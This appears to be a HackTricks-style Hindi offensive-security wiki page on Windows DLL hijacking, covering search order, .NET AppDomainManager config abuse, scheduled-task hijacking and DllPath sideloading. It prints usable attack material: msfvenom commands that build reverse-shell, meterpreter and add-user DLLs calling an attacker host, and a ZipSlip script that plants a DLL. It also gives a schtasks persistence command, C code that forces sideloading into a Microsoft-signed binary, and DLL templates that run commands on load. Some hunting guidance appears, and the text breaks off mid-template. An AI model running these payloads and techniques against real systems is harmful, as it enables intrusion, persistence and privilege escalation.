# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking में किसी भरोसेमंद application से malicious DLL लोड करवाना शामिल है। इस शब्द में **DLL Spoofing, Injection और Side-Loading** जैसी कई तकनीकें आती हैं। इसका मुख्य उपयोग code execution और persistence हासिल करने के लिए होता है; privilege escalation के लिए इसका उपयोग कम होता है। यहाँ भले ही escalation पर ध्यान दिया गया हो, लेकिन hijacking का तरीका अलग-अलग उद्देश्यों के लिए एक जैसा रहता है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीके इस्तेमाल किए जाते हैं। उनकी प्रभावशीलता इस बात पर निर्भर करती है कि application DLL लोड करने की कौन-सी रणनीति अपनाता है:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: असली DLL की जगह malicious DLL रखना। मूल DLL की कार्यक्षमता बनाए रखने के लिए वैकल्पिक रूप से DLL Proxying का उपयोग किया जा सकता है।
2. **DLL Search Order Hijacking**: malicious DLL को search path में वैध DLL से पहले रखना और application के search pattern का फ़ायदा उठाना।
3. **Phantom DLL Hijacking**: application के लिए ऐसी malicious DLL बनाना जिसे वह किसी आवश्यक, लेकिन मौजूद न होने वाली DLL के रूप में लोड करे।
4. **DLL Redirection**: application को malicious DLL की ओर निर्देशित करने के लिए `%PATH%` या `.exe.manifest` / `.exe.local` फ़ाइलों जैसे search parameters में बदलाव करना।
5. **WinSxS DLL Replacement**: WinSxS directory में वैध DLL की जगह उसका malicious विकल्प रखना। यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: copied application के साथ malicious DLL को user-controlled directory में रखना। यह Binary Proxy Execution तकनीकों जैसा है।

कोई application अपना **DLL loader** भी लागू कर सकता है। कोई privileged process `Libraries` या `Plugins` जैसी child directory की जाँच करके चुनी गई DLL को किसी helper को दे सकता है; यह सामान्य Windows DLL search order से स्वतंत्र होता है। अगर कोई दूसरा account उस सटीक directory में फ़ाइलें बना सकता है, तो इसे जाँच का एक सुराग मानें: process identity, directory के प्रभावी ACL, file-selection rule और उस तक पहुँचने योग्य load operation की पुष्टि करें। Executable के बगल में writable directory होने से यह साबित नहीं होता कि process वहाँ से DLL लोड करता है।

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

किसी भरोसेमंद **.NET Framework** process से attacker code लोड करवाने का एकमात्र तरीका classic DLL sideloading नहीं है। अगर target executable एक **managed** application है, तो CLR executable के नाम पर बनी **application configuration file** भी देखता है (उदाहरण के लिए `Setup.exe.config`)। इस फ़ाइल में custom **AppDomainManager** तय किया जा सकता है। अगर config किसी attacker-controlled assembly की ओर संकेत करता है और वह EXE के बगल में रखी है, तो CLR उसे **application के सामान्य code path से पहले** लोड करता है और भरोसेमंद process के भीतर चलाता है।<sup>[[24]](#references)</sup>

Microsoft के .NET Framework configuration schema के अनुसार, custom manager का उपयोग करने के लिए `<appDomainManagerAssembly>` और `<appDomainManagerType>` दोनों मौजूद होने चाहिए।<sup>[[16]](#references)[[17]](#references)</sup>

न्यूनतम config:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

न्यूनतम प्रबंधक:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Practical notes:
- यह **.NET Framework specific** tradecraft है। यह Win32 DLL search order के बजाय CLR config parsing पर निर्भर करता है।
- Host वास्तव में **managed EXE** होना चाहिए। Quick triage: `sigcheck -m target.exe`, `corflags target.exe`, या PE metadata में **CLR Runtime Header** देखें।
- Config filename का executable name से बिल्कुल मेल खाना चाहिए (`<binary>.config`) और आमतौर पर यह **EXE के बगल में** होता है।
- **Signed Microsoft/vendor binaries** के साथ यह उपयोगी है, क्योंकि trusted EXE को बिना बदले छोड़कर malicious managed assembly को in-process execute किया जा सकता है।
- अगर आपके पास पहले से writable installer/update directory है, तो AppDomainManager hijacking को **first stage** के रूप में इस्तेमाल किया जा सकता है, जिसके बाद आगे के stages के लिए classic DLL sideloading या reflective loading का उपयोग किया जा सकता है।

### AppDomainManager को downloader + scheduled-task bootstrap के रूप में इस्तेमाल करना

एक व्यावहारिक intrusion pattern में trusted managed EXE के साथ malicious `*.config` और malicious AppDomainManager DLL का उपयोग किया जाता है, जो केवल **एक छोटे bootstrapper** के रूप में काम करता है:<sup>[[25]](#references)</sup>

1. User किसी भरोसेमंद दिखने वाली location, जैसे `%USERPROFILE%\Downloads`, से signed .NET installer या updater launch करता है।
2. साथ में मौजूद config, CLR को legitimate app logic शुरू होने **से पहले** attacker assembly load करने के लिए कहता है।
3. Malicious manager **path gate** लागू करता है (उदाहरण के लिए, केवल तभी आगे बढ़ना जब host EXE `Downloads` से चल रहा हो, और second stage को केवल `%LOCALAPPDATA%` से चलने देना)।
4. Check पास होने पर, यह real payload को `%LOCALAPPDATA%\PerfWatson2.exe` जैसे user-writable path में download करता है और scheduled task के साथ persistence स्थापित करता है।

यह variant क्यों महत्वपूर्ण है:
- Signed host EXE अपरिवर्तित रहता है, इसलिए केवल main binary का hash जाँचने वाला triage compromise को पकड़ नहीं सकता।
- सरल **path-based anti-analysis** आम है: ZIP/EXE/DLL triad को Desktop, Temp या sandbox path पर ले जाने से जानबूझकर chain टूट सकती है।
- First-stage AppDomainManager DLL छोटी और low-noise रह सकती है, जबकि असली implant बाद में fetch किया जाता है।

इस pattern के साथ अक्सर देखा जाने वाला minimal persistence example:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- `/rl highest` का अर्थ उस user/session के लिए **उपलब्ध सर्वोच्च** है; यह अपने आप में SYSTEM तक escalation की गारंटी नहीं देता।
- इस technique को अक्सर classic missing-DLL search-order hijacking के बजाय **.NET config abuse के ज़रिए execution/persistence** के रूप में वर्गीकृत करना बेहतर होता है, हालांकि operators अक्सर दोनों को साथ में chain करते हैं।

Detection pivots:
- Signed .NET executables, जो **ZIP extraction paths**, `Downloads`, `%TEMP%` या अन्य user-writable folders से किसी **साथ मौजूद** `<exe>.config` के साथ launch किए जाते हैं।
- नए scheduled tasks, जिनकी action `%LOCALAPPDATA%`, `%APPDATA%` या `Downloads` के भीतर किसी path पर जाती है और जिनके नाम browser/vendor updaters जैसे लगते हैं।
- ऐसे कम समय तक चलने वाले managed bootstrap processes, जो तुरंत एक और EXE download करते हैं, फिर `schtasks.exe` spawn करते हैं।
- ऐसे samples, जो जल्दी exit हो जाते हैं, जब तक कि executable path किसी अपेक्षित user-profile directory से match न करे।

### sideload chain को फिर से launch करने के लिए किसी मौजूदा scheduled task को Hijack करना

Persistence के लिए, केवल **नया task बनाने** की तलाश न करें। कुछ intrusion sets इंतज़ार करते हैं कि कोई legitimate installer एक **सामान्य updater task** बनाए, फिर मौजूदा नाम, author और trigger को defenders के लिए परिचित बनाए रखते हुए **task action को rewrite** करते हैं।

Reusable workflow:
1. Legitimate software install/run करें और उस task की पहचान करें जिसे वह आम तौर पर बनाता है।
2. Task XML export करें और मौजूदा `<Exec><Command>` / `<Arguments>` values नोट करें।<sup>[[23]](#references)</sup>
3. केवल action को बदलें, ताकि task किसी user-writable staging directory से आपका **trusted host EXE** शुरू करे; यह फिर असली payload को side-load या AppDomain-load करता है।
4. कोई नया स्पष्ट persistence artifact बनाने के बजाय उसी task name को फिर से register करें।

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

यह अधिक stealthy क्यों है:
- Task name अब भी legitimate दिख सकता है (उदाहरण के लिए, किसी vendor का updater)।
- इसे **Task Scheduler service** launch करती है, इसलिए parent/ancestor validation में अक्सर `explorer.exe` के बजाय expected scheduling chain दिखती है।
- जो DFIR teams केवल **नए task names** खोजती हैं, वे ऐसे task को miss कर सकती हैं जिसका registration पहले से मौजूद था, लेकिन जिसका action अब `%LOCALAPPDATA%`, `%APPDATA%` या किसी अन्य attacker-controlled path पर point करता है।

तेज़ी से hunting करने के तरीके:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Baseline से `C:\Windows\System32\Tasks\*` XML और `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata की तुलना करें।
- जब कोई **vendor जैसा दिखने वाला updater task**, **user-writable directories** से execute हो या colocated `*.config` file वाली .NET EXE launch करे, तो alert करें।

> [!TIP]
> DLL sideloading के ऊपर HTML staging, AES-CTR configs और .NET implants को जोड़ने वाली step-by-step chain के लिए, नीचे दिया गया workflow देखें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing DLLs ढूँढना

किसी system में missing DLLs ढूँढने का सबसे आम तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना और **नीचे दिए गए 2 filters सेट करना** है:

![Common Techniques - Missing DLLs ढूँढना: किसी system में missing DLLs ढूँढने का सबसे आम तरीका sysinternals से procmon चलाना और नीचे दिए गए 2 filters सेट करना](<../../../images/image (961).png>)

![Common Techniques - Missing DLLs ढूँढना: किसी system में missing DLLs ढूँढने का सबसे आम तरीका sysinternals से procmon चलाना और नीचे दिए गए 2 filters सेट करना](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएँ:

![Common Techniques - Missing DLLs ढूँढना: और केवल File System Activity दिखाएँ](<../../../images/image (153).png>)

अगर आप **सामान्य रूप से missing DLLs** ढूँढ रहे हैं, तो इसे कुछ **सेकंड** तक चलने दें।\
अगर आप किसी **विशिष्ट executable में missing DLL** ढूँढ रहे हैं, तो **"Process Name" "contains" `<exec name>`** जैसा एक और filter सेट करें, उसे execute करें और events की capturing रोक दें।<sup>[[9]](#references)</sup>

## Missing DLLs का फायदा उठाना

Privileges escalate करने के लिए, ऐसी **DLL ढूँढें जिसे कोई privileged process** उस location से load करने की कोशिश करता है जहाँ आप write कर सकते हैं। ऐसा तब हो सकता है जब आप उस directory को control करते हों जिसे legitimate DLL वाली directory से पहले search किया जाता है, या जब माँगी गई DLL मौजूद न हो और आप किसी searched directory में write कर सकते हों।

### DLL Search Order

**[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **में आप देख सकते हैं कि DLLs को विशेष रूप से कैसे load किया जाता है।**

**Windows applications** DLLs को खोजने के लिए **पहले से तय search paths** का एक निश्चित क्रम अपनाती हैं। DLL hijacking की समस्या तब आती है जब कोई harmful DLL इन directories में से किसी एक में रणनीतिक रूप से रखी जाती है, जिससे वह authentic DLL से पहले load हो जाए। इससे बचने का एक तरीका यह सुनिश्चित करना है कि application अपनी ज़रूरत की DLLs के लिए absolute paths का इस्तेमाल करे।

नीचे **32-bit** systems का **DLL search order** दिया गया है:

1. वह directory जहाँ से application load हुई।
2. System directory। इस directory का path पाने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function का इस्तेमाल करें।(_C:\Windows\System32_)
3. 16-bit system directory। इस directory का path पाने वाला कोई function नहीं है, लेकिन इसे search किया जाता है। (_C:\Windows\System_)
4. Windows directory। इस directory का path पाने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function का इस्तेमाल करें।
   1. (_C:\Windows_)
5. Current directory।
6. PATH environment variable में सूचीबद्ध directories। ध्यान दें कि इसमें **App Paths** registry key में दिया गया per-application path शामिल नहीं होता। DLL search path की गणना करते समय **App Paths** key का इस्तेमाल नहीं होता।

यह **SafeDllSearchMode** enabled होने पर लागू होने वाला **default** search order है। इसे disable करने पर current directory दूसरे स्थान पर आ जाती है। इस feature को disable करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाएँ और इसे 0 पर set करें (default रूप से enabled होता है)।

अगर [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ call किया जाता है, तो search उस executable module की directory से शुरू होती है जिसे **LoadLibraryEx** load कर रहा है।

अंत में, DLL को नाम के बजाय absolute path से load किया जा सकता है। ऐसी स्थिति में Windows DLL के लिए केवल उसी path को देखता है; नाम से माँगी गई dependencies फिर भी लागू search order का पालन करती हैं।

Search order बदलने के और भी तरीके हैं, लेकिन मैं उन्हें यहाँ नहीं समझाऊँगा।

### Arbitrary file write को missing-DLL hijack में बदलना

**संबंधित technique:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) का इस्तेमाल करके उन DLL names को इकट्ठा करें जिन्हें process खोजता है, लेकिन ढूँढ नहीं पाता।<sup>[[14]](#references)</sup>
2. अगर binary **schedule/service** पर चलती है, तो उन names में से किसी एक नाम की DLL को **application directory** (search-order entry #1) में रखने पर वह अगले execution में load होगी। .NET scanner के एक मामले में, असली copy को `C:\Program Files\dotnet\fxr\...` से load करने से पहले process ने `C:\samples\app\` में `hostfxr.dll` खोजी।
3. किसी भी export के साथ payload DLL (उदाहरण के लिए, reverse shell) बनाएँ: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`।
4. अगर आपका primitive **ZipSlip-style arbitrary write** है, तो ऐसी ZIP बनाएँ जिसकी entry extraction dir से बाहर निकलकर DLL को app folder में रखे:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Archive को watched inbox/share में पहुँचाएँ; जब scheduled task प्रक्रिया को फिर से launch करेगा, तो यह malicious DLL load करेगा और service account के रूप में आपका code execute करेगा।

### RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए sideloading को बाध्य करना

नई बनाई गई प्रक्रिया के DLL search path को निश्चित रूप से प्रभावित करने का एक उन्नत तरीका है—ntdll की native APIs से प्रक्रिया बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath field सेट करना। यहाँ attacker-controlled directory देने पर, जो target process किसी imported DLL को नाम से resolve करता है (बिना absolute path के और safe loading flags का इस्तेमाल किए बिना), उसे उस directory से malicious DLL load करने के लिए बाध्य किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx से process parameters बनाएँ और custom DllPath दें, जो आपके नियंत्रित folder (उदाहरण के लिए, वह directory जहाँ आपका dropper/unpacker मौजूद है) की ओर इंगित करता हो।
- RtlCreateUserProcess से प्रक्रिया बनाएँ। जब target binary किसी DLL को नाम से resolve करेगी, तो loader resolution के दौरान दिए गए DllPath को देखेगा। इससे तब भी विश्वसनीय sideloading संभव होती है, जब malicious DLL target EXE के साथ उसी directory में न हो।

नोट/सीमाएँ
- इसका असर बनाई जा रही child process पर होता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- Target को DLL को नाम से import करना या LoadLibrary करना चाहिए (बिना absolute path के और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का इस्तेमाल किए बिना)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

न्यूनतम C उदाहरण (ntdll, wide strings, सरलीकृत error handling):

<details>
<summary>पूरा C उदाहरण: RTL_USER_PROCESS_PARAMETERS.DllPath के ज़रिए DLL sideloading को बाध्य करना</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operational usage example
- अपने DllPath directory में malicious xmllite.dll रखें (जो आवश्यक functions export करती हो या असली DLL को proxy करती हो)।
- ऐसी signed binary लॉन्च करें जिसके बारे में पता हो कि वह ऊपर दी गई technique का उपयोग करके xmllite.dll को नाम से खोजती है। Loader, दिए गए DllPath के ज़रिए import resolve करता है और आपकी DLL को sideload करता है।

इस technique का उपयोग in-the-wild में multi-stage sideloading chains चलाने के लिए देखा गया है: एक initial launcher helper DLL को drop करता है, जो फिर custom DllPath के साथ Microsoft-signed, hijackable binary को spawn करता है, ताकि staging directory से attacker की DLL load हो सके।<sup>[[6]](#references)</sup>


### `.exe.config` के ज़रिए .NET AppDomainManager hijacking

**.NET Framework** targets के लिए, application की पास वाली **`.exe.config`** file का दुरुपयोग करके memory patch किए बिना **`Main()` से पहले** sideloading की जा सकती है। केवल Win32 DLL search order पर निर्भर रहने के बजाय, attacker एक legitimate .NET EXE के साथ malicious config और attacker-controlled assemblies रखता है।

यह chain कैसे काम करती है:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE शुरू होता है और **CLR `<exe>.config` पढ़ता है**।
2. Config, **`<appDomainManagerAssembly>`** और **`<appDomainManagerType>`** सेट करता है, ताकि runtime attacker-controlled `AppDomainManager` को instantiate करे।
3. Malicious manager, trusted host process के भीतर **`Main()` से पहले execution** प्राप्त करता है।
4. यही config, CLR को पहले local assemblies resolve करने के लिए बाध्य कर सकता है (उदाहरण के लिए `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), और inline patching के बिना runtime validation/telemetry को कमज़ोर कर सकता है।

Campaign-जैसा pattern (सटीक nesting, directive / CLR version के अनुसार बदल सकता है):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

यह क्यों उपयोगी है:
- **`<probing privatePath="."/>`** assembly resolution को application directory तक सीमित रखता है, जिससे यह folder एक अनुमानित sideloading surface बन जाता है।<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** CLR initialization के दौरान, वैध app logic चलने से पहले, execution को attacker code में ले जाते हैं।<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** full-trust app को strong-name validation failure के बिना unsigned या tampered assemblies load करने दे सकता है।<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** newer assemblies पर publisher-policy redirects से बचाता है।<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** runtime selection को अधिक deterministic बनाता है।<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** खास तौर पर दिलचस्प है, क्योंकि configuration से **CLR अपनी ETW visibility खुद disable करता है**, न कि implant द्वारा memory में `EtwEventWrite` patch करने से।

हाल के campaigns में दिखा operational pattern:
- Stage 1 में `setup.exe`, `setup.exe.config` और local assemblies drop किए जाते हैं।
- Stage 2 में इन्हें एक विश्वसनीय दिखने वाले **AppData update** folder में copy किया जाता है, host का नाम बदलकर `update.exe` जैसा रखा जाता है और फिर **scheduled task** से दोबारा launch किया जाता है।
- Stage 3 में final RAT DLL/export load करने से पहले execution context (उदाहरण के लिए, Task Scheduler से अपेक्षित parent `svchost.exe`) verify किया जाता है।

Hunting के सुझाव:
- संदिग्ध **`.config`** files के साथ user-writable locations में चलने वाले signed या अन्यथा legitimate **.NET executables**।
- ऐसी `.config` files जिनमें **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, या **`etwEnable enabled="false"`** मौजूद हों।
- ऐसे scheduled tasks जो **`%LOCALAPPDATA%`** या app-specific `\bin\update\` directories से renamed update binaries को relaunch करते हों।
- ऐसी parent/child chains जिनमें scheduled task एक trusted .NET host launch करे, जो तुरंत अपनी directory से non-vendor assemblies load करे।

#### Windows docs में dll search order के अपवाद

Windows documentation में standard DLL search order के कुछ अपवाद बताए गए हैं:

- जब **ऐसी DLL मिलती है जिसका नाम memory में पहले से loaded DLL के नाम से मेल खाता है**, तो system सामान्य search को bypass करता है। इसके बजाय, वह memory में पहले से मौजूद DLL पर निर्भर होने से पहले redirection और manifest की जाँच करता है। **इस स्थिति में, system DLL की खोज नहीं करता**।
- यदि DLL को मौजूदा Windows version के लिए **known DLL** के रूप में पहचाना जाता है, तो system उस known DLL के अपने version और उसकी dependent DLLs का उपयोग करेगा, **और search process नहीं करेगा**। Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** में इन known DLLs की सूची होती है।
- यदि किसी **DLL की dependencies** हैं, तो इन dependent DLLs की खोज ऐसे की जाती है जैसे उन्हें केवल उनके **module names** से दर्शाया गया हो—भले ही शुरुआती DLL की पहचान full path से हुई हो।

### Privileges बढ़ाना

**आवश्यकताएँ**:

- ऐसा process पहचानें जो **अलग privileges** (horizontal या lateral movement) के अंतर्गत चलता हो या चलेगा और जिसमें **DLL मौजूद न हो**।
- सुनिश्चित करें कि किसी भी ऐसी **directory** में **write access** उपलब्ध हो जहाँ **DLL** खोजी जाएगी। यह executable की directory या system path की कोई directory हो सकती है।

डिफ़ॉल्ट रूप से ये पूर्वशर्तें आम नहीं हैं: privileged executables में आमतौर पर DLL dependencies गायब नहीं होतीं और standard users सामान्यतः system search-path directories में write नहीं कर सकते। फिर भी, misconfigured environments में ये दोनों स्थितियाँ सामने आ सकती हैं।\
यदि ये आवश्यकताएँ पूरी हों, तो [UACME](https://github.com/hfiref0x/UACME) project देखें। इसका मुख्य उद्देश्य UAC bypass है, लेकिन इसमें कुछ Windows versions के लिए DLL-hijacking PoCs हैं, जिन्हें अक्सर आपके द्वारा खोजी गई writable directory के अनुसार अनुकूलित किया जा सकता है।

ध्यान दें कि आप इस तरह **किसी folder में अपनी permissions जाँच सकते हैं**:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

और **PATH के अंदर मौजूद सभी फ़ोल्डरों की permissions जाँचें**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

आप executable के imports और dll के exports को इस कमांड से भी जांच सकते हैं:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

DLL Hijacking का **दुरुपयोग करके privileges escalate करने** की पूरी guide के लिए, जिसमें **System Path folder** में write permissions हों, देखें:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जाँच करेगा कि आपके पास system PATH के किसी भी folder में write permissions हैं या नहीं।\
इस vulnerability को खोजने के लिए अन्य उपयोगी automated tools हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### Example

अगर आपको कोई exploitable scenario मिलता है, तो उसे सफलतापूर्वक exploit करने के लिए सबसे ज़रूरी चीज़ों में से एक होगी **ऐसी dll बनाना जो कम-से-कम उन सभी functions को export करे जिन्हें executable उससे import करेगा**। ध्यान दें कि DLL Hijacking, [Medium Integrity level से High तक **(UAC को bypass करके)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM तक**](../index.html#from-high-integrity-to-system)**.** escalate करने में काम आता है। **Valid dll बनाने का उदाहरण** आप execution के लिए DLL hijacking पर केंद्रित इस DLL hijacking study में देख सकते हैं: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, **अगले section** में आपको कुछ **basic dll codes** मिलेंगे, जो **templates** के रूप में या **non required functions exported** वाली **dll** बनाने के लिए उपयोगी हो सकते हैं।

## **DLLs बनाना और compile करना**

### **DLL Proxifying**

मूल रूप से, **DLL proxy** एक ऐसी DLL है जो **load होने पर आपका malicious code execute** कर सकती है, और साथ ही **real library को सभी calls relay करके** उसे **expose** कर सकती है और उसके **अनुसार काम** कर सकती है।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) tool से आप **एक executable और proxify करने के लिए library चुन सकते हैं** और **proxified dll generate** कर सकते हैं, या **DLL चुनकर** **proxified dll generate** कर सकते हैं।

### **Meterpreter**

**Get rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter (x86) हासिल करें:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**एक user बनाएं (x86; मुझे x64 version नहीं दिखा):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### आपका अपना

कई मामलों में, आपके द्वारा compile की गई DLL को **victim process द्वारा import किए गए हर function को export करना होगा**। यदि कोई आवश्यक export मौजूद नहीं है, तो binary उसे resolve नहीं कर सकती और exploit विफल हो जाता है।

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
